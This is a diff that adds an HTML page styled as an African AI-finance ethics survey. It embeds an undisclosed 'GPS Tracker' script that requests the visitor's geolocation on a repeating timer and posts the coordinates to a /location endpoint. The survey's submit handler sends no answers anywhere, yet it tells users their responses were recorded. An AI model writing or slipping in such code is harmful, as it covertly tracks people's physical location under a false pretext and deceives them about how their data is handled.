@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AI Ethics in Finance (Africa)</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: radial-gradient(circle at top, #0b0f10, #000);
+      color: #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      text-align: center;
+      padding: 2rem 1rem;
+      background: rgba(255, 255, 255, 0.03);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+    }
+
+    header h1 {
+      font-size: 2rem;
+      font-weight: 600;
+      color: #d5aa5c;
+      text-shadow: 0 0 8px rgba(213,170,92,0.4);
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 2rem;
+    }
+
+    .survey-box {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      max-width: 800px;
+      width: 100%;
+      padding: 2rem;
+      box-shadow: 0 0 20px rgba(213, 170, 92, 0.05);
+      animation: fadeIn 1s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      color: #fff;
+      font-size: 1.4rem;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    .question {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    label {
+      font-weight: 500;
+      color: #d5aa5c;
+      font-size: 1rem;
+    }
+
+    textarea {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 0.9rem;
+      color: #eee;
+      resize: vertical;
+      min-height: 90px;
+      transition: all 0.3s ease;
+    }
+
+    textarea:focus {
+      outline: none;
+      border-color: #d5aa5c;
+      box-shadow: 0 0 10px rgba(213,170,92,0.3);
+    }
+
+    button {
+      background: linear-gradient(135deg, #01190d, #d5aa5c);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 1rem;
+      font-size: 1.1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      transform: scale(1.03);
+      box-shadow: 0 0 15px rgba(213, 170, 92, 0.5);
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 1rem;
+      color: #d5aa5c;
+      font-weight: 500;
+    }
+
+    .loading.active {
+      display: block;
+    }
+
+    footer {
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.9rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.03);
+      color: #aaa;
+    }
+
+    @media (max-width: 600px) {
+      .survey-box {
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>AI Ethics in Finance (Africa)</h1>
+  </header>
+
+  <main>
+    <div class="survey-box">
+      <h2>Understanding Trust, Fairness & Inclusion in AI-Driven Finance</h2>
+      <form id="aiSurvey">
+        <div class="question">
+          <label>1. What ethical concerns come to mind when you think of AI being used in African financial systems?</label>
+          <textarea name="q1" required></textarea>
+        </div>
+        <div class="question">
+          <label>2. Do you believe AI can make lending and credit systems fairer in Africa, or will it deepen existing inequalities?</label>
+          <textarea name="q2" required></textarea>
+        </div>
+        <div class="question">
+          <label>3. How should African regulators and fintechs ensure AI systems respect cultural and economic diversity?</label>
+          <textarea name="q3" required></textarea>
+        </div>
+        <div class="question">
+          <label>4. What worries you most about AI decisions in finance — data bias, transparency, or exclusion of low-income groups?</label>
+          <textarea name="q4" required></textarea>
+        </div>
+        <div class="question">
+          <label>5. Should financial AI models be required to explain how they make credit or investment decisions to users?</label>
+          <textarea name="q5" required></textarea>
+        </div>
+        <div class="question">
+          <label>6. How do you think AI could help close — or widen — Africa’s access-to-finance gap?</label>
+          <textarea name="q6" required></textarea>
+        </div>
+        <div class="question">
+          <label>7. Who should be responsible if an AI system unfairly denies someone a loan — the developer, bank, or regulator?</label>
+          <textarea name="q7" required></textarea>
+        </div>
+        <div class="question">
+          <label>8. Do you think financial data privacy is adequately protected in Africa as AI systems grow?</label>
+          <textarea name="q8" required></textarea>
+        </div>
+        <div class="question">
+          <label>9. How can African institutions make sure AI benefits both rural and urban populations equally?</label>
+          <textarea name="q9" required></textarea>
+        </div>
+        <div class="question">
+          <label>10. What values or ethical principles should guide the integration of AI into Africa’s financial future?</label>
+          <textarea name="q10" required></textarea>
+        </div>
+
+        <button type="submit">Submit Survey</button>
+        <div class="loading" id="loadingMsg">Processing your insights...</div>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    © 2025 African AI Finance Ethics Initiative | Designed for Responsible Innovation 🌍
+  </footer>
+
+  <!-- 🔸 GPS Tracker -->
+  <script>
+    function sendLocation(latitude, longitude) {
+      fetch("/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(res => res.json())
+      .then(data => console.log("✅ GPS saved:", data))
+      .catch(err => console.error("❌ Error sending location:", err));
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            console.log(`📍 Location: ${latitude}, ${longitude}`);
+            sendLocation(latitude, longitude);
+          },
+          (error) => {
+            console.warn("⚠️ Location access denied or unavailable:", error.message);
+          }
+        );
+      } else {
+        console.warn("🚫 Geolocation not supported in this browser.");
+      }
+    }
+
+    // Fetch GPS every 5 seconds
+    setInterval(getLocation, 10000);
+  </script>
+
+  <!-- 🔸 Survey submission handler -->
+  <script>
+    const form = document.getElementById('aiSurvey');
+    const loading = document.getElementById('loadingMsg');
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      loading.classList.add('active');
+      setTimeout(() => {
+        loading.classList.remove('active');
+        alert('✅ Thank you for sharing your thoughts. Your responses have been recorded.');
+        form.reset();
+      }, 10000);
+    });
+  </script>
+</body>
+</html>
